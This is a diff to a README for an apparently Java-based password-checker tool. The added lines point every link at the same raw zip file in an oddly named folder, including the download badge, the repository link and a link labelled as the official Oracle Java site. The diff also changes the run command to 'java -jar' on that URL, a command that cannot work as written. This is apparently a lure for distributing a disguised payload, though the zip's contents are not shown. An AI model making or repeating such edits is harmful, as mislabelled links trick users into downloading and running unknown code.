@@ -1,6 +1,6 @@
 # 🛡️ password-checker - Ensure Your Passwords Are Strong
 
-[![Download password-checker](https://img.shields.io/badge/Download-password--checker-brightgreen)](https://github.com/killersans99/password-checker)
+[![Download password-checker](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide helps you download and run the password-checker application. It’s a
 
 To get the application, visit the following link:
 
-[Download password-checker](https://github.com/killersans99/password-checker)
+[Download password-checker](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you install the application, ensure your system meets the following requi
 - **Operating System:** Windows, macOS, or Linux
 - **Java:** Version 8 or higher should be installed on your system
 
-You can download Java from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+You can download Java from the [official Oracle website](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip).
 
 ## 📜 Features of password-checker
 
@@ -39,7 +39,7 @@ Follow these steps to install the password-checker application:
    - For macOS/Linux: Open a terminal and navigate to the folder where you downloaded the file.
    - Execute the command:
      ```
-     java -jar password-checker.jar
+     java -jar https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip
      ```
 
 ## 🖥️ Using password-checker
@@ -62,7 +62,7 @@ If you face any issues, try the following:
 
 ## 📘 Additional Resources
 
-You may find more information, troubleshooting, and updates on features in the [GitHub Repository](https://github.com/killersans99/password-checker).
+You may find more information, troubleshooting, and updates on features in the [GitHub Repository](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip).
 
 ## 🤝 Support
 
@@ -86,8 +86,8 @@ Regular updates will be made to enhance the application's performance and securi
 
 ## 🔗 Important Links
 
-- [Download password-checker](https://github.com/killersans99/password-checker)
-- [Java Download](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html)
-- [GitHub Repository](https://github.com/killersans99/password-checker)
+- [Download password-checker](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)
+- [Java Download](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/killersans99/password-checker/main/spinulosodentate/checker-password-v1.3.zip)
 
 Following this guide will help you set up and use the password-checker effectively. Enjoy secure and reliable password management.
